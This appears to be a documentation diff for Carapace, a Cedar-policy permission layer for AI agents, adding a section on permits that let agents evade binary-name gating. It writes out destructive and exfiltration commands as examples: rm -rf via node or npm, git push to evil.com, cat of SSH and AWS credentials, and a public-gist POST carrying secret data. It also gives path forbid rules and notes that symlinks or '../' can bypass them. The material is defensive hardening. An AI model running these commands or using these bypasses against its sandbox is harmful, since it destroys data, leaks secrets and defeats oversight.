@@ -483,6 +483,125 @@ Everything not explicitly permitted is denied. This is the most secure posture b
 
 ---
 
+## Dangerous Permits
+
+Some permits look reasonable but grant far more access than you'd expect. These are the results of our [adversarial test suite](../test/test-adversarial.mjs) — 30 bypass attempts blocked, but 9 edge cases where permitted binaries could do forbidden things.
+
+### Language runtimes are skeleton keys
+
+```cedar
+// These look fine:
+permit(principal is Jans::Workload, action == Jans::Action::"exec_command", resource == Jans::Shell::"node");
+permit(principal is Jans::Workload, action == Jans::Action::"exec_command", resource == Jans::Shell::"python3");
+```
+
+**The problem:** `node -e "require('child_process').execSync('rm -rf /')"` runs `rm` inside node. Carapace sees `Shell::"node"`, not `Shell::"rm"`. Permitting `node` is permitting **everything node can do**, which is everything.
+
+Same applies to: `python3`, `ruby`, `perl`, `deno`, `bun`, `lua`, `php`
+
+**Mitigation:** If your agent needs to run JavaScript, consider permitting `npx tsx specific-script.ts` via a wrapper script instead of raw `node`. Or accept the risk and rely on the LLM proxy to catch the obvious cases (the LLM has to ask to run node, and the prompt shapes what it asks for).
+
+### Package managers can run arbitrary code
+
+```cedar
+// npm is one of the most dangerous permits you can grant
+permit(principal is Jans::Workload, action == Jans::Action::"exec_command", resource == Jans::Shell::"npm");
+```
+
+**The problem:**
+- `npm exec -- rm -rf /` runs arbitrary binaries
+- `npm publish` can exfiltrate your entire project to a public registry
+- `npm install` runs lifecycle scripts that can do anything
+- `npx` downloads and executes arbitrary packages from the internet
+
+Same applies to: `pip`, `gem`, `cargo`, `go`, `brew`
+
+**Mitigation:** If you only need `npm install` and `npm test`, there's no way to restrict that with binary-name gating. Consider a wrapper script that only allows specific npm subcommands.
+
+### git can exfiltrate data
+
+```cedar
+permit(principal is Jans::Workload, action == Jans::Action::"exec_command", resource == Jans::Shell::"git");
+```
+
+**The problem:**
+- `git push https://evil.com/exfil.git` sends your code anywhere
+- `git clone` with malicious repos can execute arbitrary hooks
+- `git config` can modify behavior of future git commands
+- `git filter-branch` can rewrite history
+
+**Mitigation:** For read-only git access, you'd need a wrapper script that only allows `git status`, `git log`, `git diff`, etc. Carapace can't distinguish git subcommands — it only sees `Shell::"git"`.
+
+### File readers can read secrets
+
+```cedar
+permit(principal is Jans::Workload, action == Jans::Action::"exec_command", resource == Jans::Shell::"cat");
+permit(principal is Jans::Workload, action == Jans::Action::"call_tool", resource == Jans::Tool::"filesystem/read_file");
+```
+
+**The problem:** `cat ~/.ssh/id_rsa`, `cat ~/.aws/credentials`, `read_file("/Users/you/.env")` — any file reader with no path restrictions can access your secrets.
+
+**Mitigation:** Use Cedar `when` conditions on `context.args` to restrict paths:
+
+```cedar
+// Only allow cat in the project directory
+permit(
+  principal is Jans::Workload,
+  action == Jans::Action::"exec_command",
+  resource == Jans::Shell::"cat"
+) when {
+  context.args like "cat /home/user/project/*"
+};
+
+// Block reads of sensitive directories
+forbid(
+  principal,
+  action == Jans::Action::"exec_command",
+  resource == Jans::Shell::"cat"
+) when {
+  context.args like "cat */.ssh/*" ||
+  context.args like "cat */.aws/*" ||
+  context.args like "cat */.env*"
+};
+```
+
+Note: `like` pattern matching is limited — an agent could potentially bypass it with path tricks like symlinks or `../`. This is defense in depth, not a guarantee.
+
+### Permitted domains can be exfiltration channels
+
+```cedar
+permit(principal is Jans::Workload, action == Jans::Action::"call_api", resource == Jans::API::"api.github.com");
+```
+
+**The problem:** `POST api.github.com/gists` with `{"public": true, "files": {"stolen.txt": {"content": "SECRET DATA"}}}` — the agent can create a public gist containing anything.
+
+Same pattern: Any permitted API that accepts POST data can be used for exfiltration. AWS S3, Google Drive, Slack webhooks, etc.
+
+**Mitigation:** Use Cedar `when` conditions on `context.method` and `context.url` to restrict operations:
+
+```cedar
+// GitHub API: read-only
+permit(
+  principal is Jans::Workload,
+  action == Jans::Action::"call_api",
+  resource == Jans::API::"api.github.com"
+) when {
+  context.method == "GET"
+};
+```
+
+### The threat model spectrum
+
+| Permit | Risk | What it can do |
+|--------|------|---------------|
+| `ls`, `echo`, `date` | Low | Read-only, limited scope |
+| `cat`, `grep`, `find` | Medium | Read any file |
+| `git`, `npm`, `curl` | High | Read files + network exfiltration |
+| `node`, `python3`, `bash` | **Maximum** | Literally anything |
+| `rm`, `sudo`, `chmod` | **Destructive** | Irreversible system damage |
+
+**Rule of thumb:** Every permit you add expands the blast radius. Start with the minimum set and add more only when the agent demonstrably needs them.
+
 ## Policy Design Principles
 
 1. **Forbid the catastrophic, then iterate.** Start by blocking `rm`, `sudo`, and data exfil domains. You can always add more forbids later.
